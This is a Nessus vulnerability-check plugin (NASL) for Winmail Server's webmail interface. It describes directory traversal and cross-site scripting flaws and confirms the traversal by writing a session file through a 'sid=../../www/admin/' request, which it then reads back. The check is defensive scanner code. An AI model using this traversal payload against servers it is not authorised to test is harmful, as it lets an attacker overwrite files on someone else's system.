#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote webmail server is affected by directory traversal and
cross-site scripting vulnerabilities. 

Description :

The remote host is running Winmail Server, a commercial mail server
for Windows from AMAX Information Technologies. 

The web interface that is used by Winmail Server for reading mail and
administering the server fails to sanitize user-supplied input to
various parameters and scripts.  Beyond the usual cross-site scripting
attacks, this can also be leveraged by an unauthenticated attacker to
overwrite arbitrary files on the affected system, which could
compromise the system's integrity. 

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2005-11/0580.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:N/I:P/B:I)";


if (description) {
  script_id(20227);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-3692", "CVE-2005-3811");
  script_bugtraq_id(15493);
  script_xref(name:"OSVDB", value:"20925");
  script_xref(name:"OSVDB", value:"20926");
  script_xref(name:"OSVDB", value:"20927");
  script_xref(name:"OSVDB", value:"20928");

  script_name(english:"Winmail Server <= 4.2 Build 0824 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in Winmail Server <= 4.2 Build 0824");

  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 6080, 6443);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:6080);
if (!get_port_state(port)) port = get_http_port(default:6443);
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner looks like Winmail Server.
if (report_paranoia < 2) {
  res = http_get_cache(item:"/index.php", port:port);
  if (
    isnull(res) || 
    "<title>WebMail | Powered by Winmail Server" >!< res
  ) exit(0);
}


# Try to exploit one of the flaws to create a special session file.
#
# nb: we don't have control a lot of control over the file contents,
#     but we can append a NULL byte to the value and avoid having
#     ".sess" appended to the filename.
file = string(SCRIPT_NAME, "_", rand_str());
req = http_get(
  item:string(
    "/admin/main.php?",
    # nb: put it where we can access it.
    "sid=../../www/admin/", file
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
# nb: the server won't return anything.
#if (res == NULL) exit(0);


# Now try to retrieve our session file.
req = http_get(item:string("/admin/", file, ".sess"), port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if the result looks like a session file.
session = base64_decode(str:res);
if (session && 'a:3:{s:4:"user";N;s:4:"pass";' >< session) {
  if (report_verbosity > 0) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus was able to create the following file on the remote host,\n",
      "under the directory in which Winmail Server is installed:\n",
      "\n",
      "  server\\webmail\\www\\admin\\", file, ".sess\n"
    );
  }
  else report = desc;

  security_warning(port:port, data:report);
  exit(0);
}
